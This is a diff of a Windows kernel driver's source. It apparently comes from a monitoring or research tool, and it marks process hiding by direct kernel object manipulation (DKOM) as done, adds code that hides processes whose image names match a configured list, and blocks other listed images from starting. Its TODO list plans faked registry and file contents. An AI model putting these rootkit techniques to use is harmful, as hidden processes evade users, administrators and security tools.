@@ -9,18 +9,20 @@ Module Name:
 
 TODO:
 
-    - Process Hide by DKOM by R3 config
-    - Create Process from R0 with parent by IOCTL
-    - Block process image creation by R3 config (F*ck slui.exe :P )
+    
+    
     - Report as JSON
 
-    // durante COVID
+    // Pascua
 
     - WMI mon&pwn 
+    - Create Process from with parent by IOCTL
     - Fake registry content by R3 config
     - Fake file content by R3 config
     - Get more Info by PID using: stack trace, PEB, EPROCESS
     - Add Driver IOCTL monitor
+
+    // COVID6
 
 DONE:
 
@@ -36,7 +38,9 @@ DONE:
     - PID Filtering
     - PID Following
     - IOCTL to disable FBP (Filter by process)
-    - R3 config load and parse.
+    - R3 config load, parse and send to R0 by IOCTL.
+    - Process Hide by DKOM by R3 config
+    - Block process image creation by R3 config
 
 
 --*/
@@ -129,7 +133,7 @@ WCHAR Hprocs[Maxhprocs][100];
 void hprocsinit() {
     nhprocs = 0;
     for (int i = 0; i < Maxhprocs; i++) {
-        ::wcsncpy_s(Hprocs[i], L"-", 2);
+        ::wcsncpy_s(Hprocs[i], L"-*", 3);
     }
 }
 bool FindHProc(WCHAR* proc) {
@@ -145,7 +149,7 @@ bool FindHProc(WCHAR* proc) {
 bool AddHProc(WCHAR* proc, int len) {
     if (!FindHProc(proc)){
         for (int i = 0; i < Maxhprocs; i++) {
-            if (wcsstr(Hprocs[i], L"-") != nullptr) {
+            if (wcsstr(Hprocs[i], L"-*") != nullptr) {
                 ::wcsncpy_s(Hprocs[i], proc, len / sizeof(WCHAR));
                 nhprocs++;
                 return true;
@@ -162,7 +166,7 @@ WCHAR Kprocs[Maxkprocs][100];
 void kprocsinit() {
     nkprocs = 0;
     for (int i = 0; i < Maxkprocs; i++) {
-        ::wcsncpy_s(Kprocs[i], L"-", 2);
+        ::wcsncpy_s(Kprocs[i], L"-*", 3);
     }
 }
 bool FindKProc(WCHAR* proc) {
@@ -178,7 +182,7 @@ bool FindKProc(WCHAR* proc) {
 bool AddKProc(WCHAR* proc, int len) {
     if (!FindHProc(proc)) {
         for (int i = 0; i < Maxkprocs; i++) {
-            if (wcsstr(Kprocs[i], L"-") != nullptr) {
+            if (wcsstr(Kprocs[i], L"-*") != nullptr) {
                 ::wcsncpy_s(Kprocs[i], proc, len / sizeof(WCHAR));
                 nkprocs++;
                 return true;
@@ -992,8 +996,12 @@ void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO
     AutoLock<FastMutex> lock(Mutex);
     if (CreateInfo != nullptr && CreateInfo->ImageFileName != nullptr){
         ::wcsncpy_s(Lastimage, CreateInfo->ImageFileName->Buffer, CreateInfo->ImageFileName->Length / sizeof(WCHAR));
-        FindHProc(Lastimage);
-        FindKProc(Lastimage);
+        if (FindHProc(Lastimage)) {
+            hideprocbypid(ProcessId);
+        }
+        if (FindKProc(Lastimage) && CreateInfo != nullptr) {
+            CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;            
+        }
     }
 }
 
